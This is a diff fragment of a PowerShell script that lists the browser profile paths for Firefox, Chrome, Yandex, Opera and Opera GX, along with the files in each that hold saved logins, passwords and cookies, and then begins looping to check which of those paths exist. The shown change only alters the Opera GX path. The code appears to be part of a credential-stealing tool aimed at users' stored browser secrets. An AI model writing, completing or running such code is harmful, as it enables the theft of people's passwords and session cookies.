@@ -20,7 +20,7 @@ $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.jso
         1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\"), "chrome", "Login Data", "Cookies");
         2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies");
         3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Login Data", "Opera123", "Cookies");
-        4=(($env:APPDATA+"\Opera Software\Opera GX Stable\"),  "Opera5656", "Login Data", "Cookies")}
+        4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"),  "Opera5656", "Login Data", "Cookies")}
 
 for ($i=0; $i -lt 5; $i++){
   if(Test-Path -Path $lst[$i][0]){
